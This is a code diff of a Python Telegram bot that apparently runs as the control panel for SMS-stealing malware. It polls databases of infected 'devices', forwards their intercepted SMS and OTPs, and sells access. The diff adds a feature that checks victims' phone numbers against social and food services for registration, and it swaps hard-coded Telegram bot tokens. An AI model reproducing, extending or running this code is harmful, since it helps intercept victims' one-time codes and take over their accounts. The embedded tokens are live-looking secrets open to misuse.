@@ -62,7 +62,7 @@ DATABASES = {f"P_{i}": url for i, url in enumerate(RAW_URLS)}
 POLL_INTERVAL   = 10  
 CACHE_INTERVAL  = 600 
 SMS_LIMIT       = 20       
-TOKEN           = "8218848065:AAFw5snj5NTWbayoXSHHIaNEg-vFPuXGm-4"
+TOKEN           = "8877437030:AAFGon2GuBerdgA2o5QGDBrc8BpBQOsIgr4"
 PAGE_SIZE       = 10
 
 ADMIN_IDS: set[int] = {6860106371}
@@ -77,7 +77,7 @@ SMS_LOG_FILE = os.path.join(SYS_DIR, "Super_Admin_SMS_Log.txt")
 CACHE_FILE = os.path.join(SYS_DIR, "device_cache.json")
 
 # 🔥 Memory Optimized Data Structures
-seen_ids = deque(maxlen=15000) # Prevents infinite RAM growth 
+seen_ids = deque(maxlen=15000) 
 first_run: bool     = True
 _main_app: Optional[Application] = None
 _http_session: Optional[aiohttp.ClientSession] = None
@@ -97,7 +97,6 @@ GLOBAL_DEVICE_CACHE: dict[str, list] = {}
 SCAN_PROGRESS = {"total": 1, "completed": 1}
 SETTINGS = {"base_price": 30, "global_panels": []}
 
-# 🔥 Throttled Connections to prevent Timeout/Crash
 HTTP_SEMAPHORE = asyncio.Semaphore(20)
 WORKER_SEMAPHORE = asyncio.Semaphore(20)
 API_LOCK = asyncio.Lock()
@@ -256,7 +255,7 @@ def master_log_sms(number: str, message: str, otp: str):
 
 async def auto_save_loop():
     while True:
-        await asyncio.sleep(300) # Increased to 5 mins to prevent disk blocking
+        await asyncio.sleep(300) 
         await save_data_async()
 
 async def hourly_backup_loop(app: Application):
@@ -270,19 +269,14 @@ async def hourly_backup_loop(app: Application):
             for adm in ADMIN_IDS: await app.bot.send_message(adm, msg, parse_mode="HTML")
         except: pass
 
-# 🔥 NEW: Anti-Crash Garbage Collector Task
 async def memory_sweeper():
     while True:
-        await asyncio.sleep(600) # Runs every 10 minutes
+        await asyncio.sleep(600) 
         now = time.time()
-        
-        # Clear old cooldowns
         expired_cd = [k for k, v in user_cooldowns.items() if now - v > 3600]
         for k in expired_cd: del user_cooldowns[k]
-        
-        # Clear old pending actions safely
         user_fresh_cache.clear() 
-        gc.collect() # Force free unused RAM
+        gc.collect() 
 
 def get_user_dbs(uinfo: dict) -> list:
     dbs, valid_urls, now = uinfo.get("custom_dbs", []), [], time.time()
@@ -316,7 +310,6 @@ def force_sub_keyboard() -> InlineKeyboardMarkup:
     ])
 
 async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
-    # Silent drop to prevent crash loops
     err_str = str(context.error)
     ignore = ["Forbidden", "Chat not found", "bot was blocked", "not modified", "Message to edit not found", "ChatNotFound", "ReadError", "NetworkError", "TimedOut", "Event loop is closed", "gaierror", "Connection reset"]
     if any(e in err_str for e in ignore): return
@@ -335,7 +328,7 @@ async def fb_get(path: str, base: str) -> Optional[dict]:
             session = await get_http_session()
             url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
             if not path: url = url.replace("?shallow=true", ".json")
-            async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r: # Lower timeout
+            async with session.get(url, timeout=aiohttp.ClientTimeout(total=4)) as r:
                 if r.status != 200: return None
                 try: return await r.json(content_type=None)
                 except Exception: return None
@@ -777,6 +770,47 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             
         if data == "open_app_search":
             await safe_edit(query, "🍔 <b>SOCIAL & FOOD OTPs (Last 24h)</b>\n━━━━━━━━━━━━━━━━━━\nSelect an app below to deeply scan all devices for its OTPs:", reply_markup=get_app_search_menu(), parse_mode="HTML")
+            return
+
+        # 🔥 FIX: SMART AUTO-CHECKER LOGIC ADDED HERE 🔥
+        if data.startswith("auto_fb:"):
+            service = data.split(":")[1]
+            await safe_edit(query, f"⏳ <b>AUTO-CHECKING LIVE NUMBERS</b>\n━━━━━━━━━━━━━━━━━━\nScanning all online devices for <b>{service.capitalize()}</b>...\n<i>Please wait, this might take a few seconds...</i>", parse_mode="HTML")
+            
+            all_devices = await get_all_devices(bot_token, chat_id, users_db)
+            online_devs = [d for d in all_devices if d.status == "online" and d.numbers]
+            
+            if not online_devs:
+                await safe_edit(query, "❌ Koi bhi number abhi online nahi hai. Thodi der baad try karein.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="open_auto_checker_menu")]]))
+                return
+                
+            # Grab up to 40 latest online numbers to prevent API ban
+            target_nums = [d.numbers[0][-10:] for d in online_devs[:40]]
+            
+            bulk_results = []
+            tasks = [check_number_api(service, num) for num in target_nums]
+            res_list = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            found_registered = 0
+            for num, res in zip(target_nums, res_list):
+                if isinstance(res, Exception) or res.get("status") == "error":
+                    continue
+                is_reg = res.get("registered", False) or res.get("is_registered", False) or (str(res.get("result", "")).lower() == "registered")
+                if is_reg:
+                    found_registered += 1
+                    bulk_results.append(f"🟢 <code>{num}</code> - Registered")
+                else:
+                    bulk_results.append(f"🔴 <code>{num}</code> - Unregistered")
+                    
+            if not bulk_results:
+                res_text = f"<b>📊 AUTO-CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n❌ API limit hit ya koi valid result nahi mila."
+            else:
+                res_text = f"<b>📊 AUTO-CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n✅ Total Checked: {len(bulk_results)}\n🎯 Registered Found: {found_registered}\n\n" + "\n".join(bulk_results[:30])
+                if len(bulk_results) > 30:
+                    res_text += f"\n...and {len(bulk_results)-30} more."
+                    
+            kb = [[InlineKeyboardButton("🔄 Scan Again", callback_data=f"auto_fb:{service}"), InlineKeyboardButton("🏠 Back", callback_data="open_auto_checker_menu")]]
+            await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
             return
 
         if data.startswith("app_search:"):
@@ -1380,13 +1414,12 @@ async def fetch_recent_sms_safely(d: Device, silent=False):
                 if not isinstance(sms, dict): continue
                 sk = seen_key(d.id, k)
                 if sk not in seen_ids:
-                    seen_ids.append(sk) # Deque auto limits length
+                    seen_ids.append(sk) 
                     if not silent:
                         try: await _forward_sms(d, sms)
                         except: pass
     except: pass
 
-# 🔥 NEW: Anti-Crash Queue (Drops extra tasks if overloaded)
 WORK_QUEUE = asyncio.Queue(maxsize=3000)
 ACTIVE_WORKERS = []
 MAX_WORKERS = 10 
@@ -1504,7 +1537,7 @@ def main() -> None:
         load_data()
         asyncio.create_task(worker_auto_scaler()) 
         asyncio.create_task(cache_compiler())
-        asyncio.create_task(memory_sweeper()) # 🔥 GC Sweep Task
+        asyncio.create_task(memory_sweeper()) 
         asyncio.create_task(master_dispatcher(application))
         asyncio.create_task(auto_save_loop())
         asyncio.create_task(hourly_backup_loop(application))
